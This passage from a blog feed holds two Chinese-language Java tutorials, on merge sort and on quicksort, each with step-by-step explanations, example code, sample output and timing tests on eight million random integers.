        <content type="html"><![CDATA[<h1 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h1><h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h2><p>归并排序（MERGE-SORT）是利用归并的思想实现的排序方法，该算法采用经典的分治（divide-and-conquer）策略（分治法将问题分(divide)成一些小的问题然后递归求解，而治(conquer)的阶段则将分的阶段得到的各答案”修补”在一起，即分而治之)。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214942.png"></p><p>分阶段可以理解为就是递归拆分子序列的过程。</p><p>再来看看治阶段，我们需要将两个已经有序的子序列合并成一个有序序列，比如上图中的最后一次合并，要将[4,5,7,8]和[1,2,3,6]两个已经有序的子序列，合并为最终序列[1,2,3,4,5,6,7,8]，来看下实现步骤：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215001.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215004.png"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MergeSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] arr = &#123; <span class="number">8</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span> &#125;;</span><br><span class="line">mergeSort(arr, <span class="number">0</span>, arr.length-<span class="number">1</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;归并排序后=&quot;</span> + Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分+合方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mergeSort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>; <span class="comment">// 中间索引</span></span><br><span class="line"><span class="comment">// 向左递归进行分解</span></span><br><span class="line">mergeSort(arr, left, mid);</span><br><span class="line"><span class="comment">// 向右递归进行分解</span></span><br><span class="line">mergeSort(arr, mid + <span class="number">1</span>, right);</span><br><span class="line"><span class="comment">// 合并</span></span><br><span class="line">merge(arr, left, mid, right);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> mid, <span class="type">int</span> right)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left; <span class="comment">// 初始化i, 左边有序序列的初始索引</span></span><br><span class="line"><span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> mid + <span class="number">1</span>; <span class="comment">// 初始化j, 右边有序序列的初始索引</span></span><br><span class="line"><span class="type">int</span>[] temp = <span class="keyword">new</span> <span class="title class_">int</span>[right - left + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> <span class="variable">t</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// 指向temp数组的当前索引</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// (一)</span></span><br><span class="line"><span class="comment">// 先把左右两边(有序)的数据按照规则填充到temp数组</span></span><br><span class="line"><span class="comment">// 直到左右两边的有序序列，有一边处理完毕为止</span></span><br><span class="line"><span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= right) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &lt;= arr[j]) &#123;</span><br><span class="line">temp[t++] = arr[i++];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">temp[t++] = arr[j++];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (二)</span></span><br><span class="line"><span class="comment">// 把有剩余数据的一边的数据依次全部填充到temp</span></span><br><span class="line"><span class="keyword">while</span> (i &lt;= mid) &#123;</span><br><span class="line">temp[t++] = arr[i++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (j &lt;= right) &#123;</span><br><span class="line">temp[t++] = arr[j++];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (三)</span></span><br><span class="line"><span class="comment">// 将temp数组的元素拷贝到arr</span></span><br><span class="line">System.out.println(<span class="string">&quot;left: &quot;</span> + left + <span class="string">&quot;  right:&quot;</span> + right + <span class="string">&quot;  t:&quot;</span> + t);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; t; k++) &#123;</span><br><span class="line">arr[left++] = temp[k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>left: 0  right:1  t:2<br>left: 2  right:3  t:2<br>left: 0  right:3  t:4<br>left: 4  right:5  t:2<br>left: 6  right:7  t:2<br>left: 4  right:7  t:4<br>left: 0  right:7  t:8<br>归并排序后&#x3D;[1, 2, 3, 4, 5, 6, 7, 8]</p><h2 id="对于代码中mergeSort方法的理解"><a href="#对于代码中mergeSort方法的理解" class="headerlink" title="对于代码中mergeSort方法的理解"></a>对于代码中mergeSort方法的理解</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mergeSort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>; <span class="comment">// 中间索引</span></span><br><span class="line"><span class="comment">// 向左递归进行分解</span></span><br><span class="line">mergeSort(arr, left, mid);</span><br><span class="line"><span class="comment">// 向右递归进行分解</span></span><br><span class="line">mergeSort(arr, mid + <span class="number">1</span>, right);</span><br><span class="line"><span class="comment">// 合并</span></span><br><span class="line">merge(arr, left, mid, right);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这个方法其实就是先一直分割左子列，分割到如图的第三列的 84 时，就不会再继续向左分割，不满足向左递归进行分解的条件，接着向右递归进行分解，发现条件也不满足，所以没有分割到如图的第四列（两条虚线紧夹着的位置），最后执行按序合并4和8的操作。回溯到8457，执行向右递归进行分解，分成57后也是不能在分解了，按序合并57。回溯到8457执行按序合并。</p></blockquote><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214942.png"></p><h2 id="测试归并排序的速度"><a href="#测试归并排序的速度" class="headerlink" title="测试归并排序的速度"></a>测试归并排序的速度</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MergeSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 创建要给8000000个的随机的数组 八百万</span></span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">8000000</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8000000</span>; i++) &#123;</span><br><span class="line">arr[i] = (<span class="type">int</span>) (Math.random() * <span class="number">8000000</span>); <span class="comment">// 生成一个[0, 8000000) 数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">date1Str</span> <span class="operator">=</span> simpleDateFormat.format(data1);</span><br><span class="line">System.out.println(<span class="string">&quot;排序前的时间是=&quot;</span> + date1Str);</span><br><span class="line"></span><br><span class="line">mergeSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">date2Str</span> <span class="operator">=</span> simpleDateFormat.format(data2);</span><br><span class="line">System.out.println(<span class="string">&quot;排序后的时间是=&quot;</span> + date2Str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分+合方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mergeSort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>; <span class="comment">// 中间索引</span></span><br><span class="line"><span class="comment">// 向左递归进行分解</span></span><br><span class="line">mergeSort(arr, left, mid);</span><br><span class="line"><span class="comment">// 向右递归进行分解</span></span><br><span class="line">mergeSort(arr, mid + <span class="number">1</span>, right);</span><br><span class="line"><span class="comment">// 合并</span></span><br><span class="line">merge(arr, left, mid, right);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> mid, <span class="type">int</span> right)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left; <span class="comment">// 初始化i, 左边有序序列的初始索引</span></span><br><span class="line"><span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> mid + <span class="number">1</span>; <span class="comment">// 初始化j, 右边有序序列的初始索引</span></span><br><span class="line"><span class="type">int</span>[] temp = <span class="keyword">new</span> <span class="title class_">int</span>[right - left + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> <span class="variable">t</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// 指向temp数组的当前索引</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// (一)</span></span><br><span class="line"><span class="comment">// 先把左右两边(有序)的数据按照规则填充到temp数组</span></span><br><span class="line"><span class="comment">// 直到左右两边的有序序列，有一边处理完毕为止</span></span><br><span class="line"><span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= right) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &lt;= arr[j]) &#123;</span><br><span class="line">temp[t++] = arr[i++];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">temp[t++] = arr[j++];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (二)</span></span><br><span class="line"><span class="comment">// 把有剩余数据的一边的数据依次全部填充到temp</span></span><br><span class="line"><span class="keyword">while</span> (i &lt;= mid) &#123;</span><br><span class="line">temp[t++] = arr[i++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (j &lt;= right) &#123;</span><br><span class="line">temp[t++] = arr[j++];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (三)</span></span><br><span class="line"><span class="comment">// 将temp数组的元素拷贝到arr</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; t; k++) &#123;</span><br><span class="line">arr[left++] = temp[k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>排序前的时间是=2020-08-03 15:07:12 排序后的时间是=2020-08-03 15:07:14</code></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 归并排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速排序</title>
      <link href="/posts/2c2a/"/>
      <url>/posts/2c2a/</url>
      
        <content type="html"><![CDATA[<h1 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h1><p>快速排序（Quicksort）是对冒泡排序的一种改进。</p><h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h2><p>1．先从数列中取出一个数作为基准数。</p><p>2．分区过程，将比这个数大的数全放到它的右边，小于或等于它的数全放到它的左边。</p><p>3．再对左右区间重复第二步，直到各区间只有一个数。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>快速排序的进一步说明：<strong>挖坑填数+分治法</strong></p><p>以一个数组作为示例，取区间第一个数为<strong>基准数</strong>。(基准数可以为数组内的任意元素，一般取首、尾或中间的元素)</p><table><thead><tr><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th></tr></thead><tbody><tr><td>72</td><td>6</td><td>57</td><td>88</td><td>60</td><td>42</td><td>83</td><td>73</td><td>48</td><td>85</td></tr></tbody></table><p>初始时，i &#x3D; 0; j &#x3D; 9;  temp &#x3D; arr[i] &#x3D; 72</p><p>由于已经将arr[0]中的数保存到temp这个临时变量中，可以理解成在数组arr[0]上挖了个坑，可以将其它数据填充到这来。</p><p>从 j 开始向前找一个比temp小或等于temp的数。当 j &#x3D;8 时，符合条件，将arr[8]挖出再填到上一个坑arr[0]中。arr[0]&#x3D;arr[8];  这样一个坑arr[0]就被搞定了，但又形成了一个新坑arr[8]，这怎么办呢？简单，再找数字来填arr[8]这个坑。这次从 i 开始向后找一个大于temp的数，当 i&#x3D;3 时，符合条件，将arr[3]挖出再填到上一个坑中。arr[8]&#x3D;arr[3];</p><hr><p>数组变为：</p><table><thead><tr><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th></tr></thead><tbody><tr><td>48</td><td>6</td><td>57</td><td>88</td><td>60</td><td>42</td><td>83</td><td>73</td><td>88</td><td>85</td></tr></tbody></table><p> i &#x3D; 3;  j &#x3D; 8; temp&#x3D;72</p><p>再重复上面的步骤，<strong>先从后向前找，再从前向后找</strong>。</p><p>从 j 开始向前找，当 j&#x3D;5 时，符合条件，将arr[5]挖出填到上一个坑中，arr[3] &#x3D; arr[5]; </p><p>从i开始向后找，当i&#x3D;5时，由于<strong>i&#x3D;&#x3D;j</strong>退出。</p><p>此时，i &#x3D; j &#x3D; 5，而a[5]刚好又是上次挖的坑，因此将temp填入arr[5]。</p><hr><p>数组变为：</p><table><thead><tr><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th></tr></thead><tbody><tr><td>48</td><td>6</td><td>57</td><td>42</td><td>60</td><td>72</td><td>83</td><td>73</td><td>88</td><td>85</td></tr></tbody></table><p>可以<strong>看出arr[5]前面的数字都小于它，arr[5]后面的数字都大于它</strong>。因此再对arr[0…4]和arr[6…9]这二个子区间<strong>重复</strong>上述步骤就可以了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1．i &#x3D;L; j &#x3D; R; 将基准数挖出形成第一个坑arr[i]。</p><p>2．j–由后向前找比它小的数，找到后挖出此数填前一个坑arr[i]中。</p><p>3．i++由前向后找比它大的数，找到后也挖出此数填到前一个坑arr[j]中。</p><p>4．再重复执行2，3二步，直到<strong>i&#x3D;&#x3D;j</strong>，将基准数填入arr[i]中。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuickSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] arr = &#123; -<span class="number">9</span>, <span class="number">78</span>, <span class="number">0</span>, <span class="number">23</span>, -<span class="number">567</span>, <span class="number">70</span> &#125;;</span><br><span class="line">quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> l, <span class="type">int</span> r)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (l &lt; r) &#123;</span><br><span class="line"><span class="comment">// 用于遍历</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> l;</span><br><span class="line"><span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> r;</span><br><span class="line"><span class="comment">// 临时变量用于存储</span></span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">            </span><br><span class="line"><span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line"><span class="keyword">while</span> (i &lt; j &amp;&amp; arr[j] &gt; temp) &#123;<span class="comment">// 从右向左找第一个小于等于temp的数</span></span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">arr[i] = arr[j];</span><br><span class="line"><span class="keyword">while</span> (i &lt; j &amp;&amp; arr[i] &lt;= temp) &#123; <span class="comment">// 从左向右找第一个大于temp的数</span></span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">arr[j] = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">            </span><br><span class="line">arr[i] = temp;</span><br><span class="line">quickSort(arr, l, i - <span class="number">1</span>); <span class="comment">// 递归调用</span></span><br><span class="line">quickSort(arr, i + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试快速插入排序的速度"><a href="#测试快速插入排序的速度" class="headerlink" title="测试快速插入排序的速度"></a>测试快速插入排序的速度</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuickSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 创建一个8000000个的随机的数组 八百万</span></span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">8000000</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8000000</span>; i++) &#123;</span><br><span class="line">arr[i] = (<span class="type">int</span>) (Math.random() * <span class="number">8000000</span>); <span class="comment">// 生成一个[0, 8000000) 数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">date1Str</span> <span class="operator">=</span> simpleDateFormat.format(data1);</span><br><span class="line">System.out.println(<span class="string">&quot;排序前的时间是=&quot;</span> + date1Str);</span><br><span class="line"></span><br><span class="line">quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">date2Str</span> <span class="operator">=</span> simpleDateFormat.format(data2);</span><br><span class="line">System.out.println(<span class="string">&quot;排序后的时间是=&quot;</span> + date2Str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> l, <span class="type">int</span> r)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (l &lt; r) &#123;</span><br><span class="line"><span class="comment">// 用于遍历</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> l;</span><br><span class="line"><span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> r;</span><br><span class="line"><span class="comment">// 临时变量用于存储</span></span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line"><span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line"><span class="keyword">while</span> (i &lt; j &amp;&amp; arr[j] &gt; temp) &#123;<span class="comment">// 从右向左找第一个小于temp的数</span></span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">arr[i] = arr[j];</span><br><span class="line"><span class="keyword">while</span> (i &lt; j &amp;&amp; arr[i] &lt;= temp) &#123; <span class="comment">// 从左向右找第一个大于等于temp的数</span></span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">arr[j] = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">arr[i] = temp;</span><br><span class="line">quickSort(arr, l, i - <span class="number">1</span>); <span class="comment">// 递归调用</span></span><br><span class="line">quickSort(arr, i + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>排序前的时间是=2020-08-03 00:13:30 排序后的时间是=2020-08-03 00:13:32</code></p><p><strong>可以看出快速排序比希尔排序还要快些。</strong></p><hr><blockquote><p><strong>原文作者:</strong> <a href="https://blog.csdn.net/MoreWindows">MoreWindows</a></p><p><strong>原文链接:</strong> <a href="http://blog.csdn.net/morewindows/article/details/6684558">http://blog.csdn.net/morewindows/article/details/6684558</a></p><p>韩顺平老师的视频里快速排序讲得有些晦涩，很感谢这位博主的文章，通俗易懂。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 快速排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
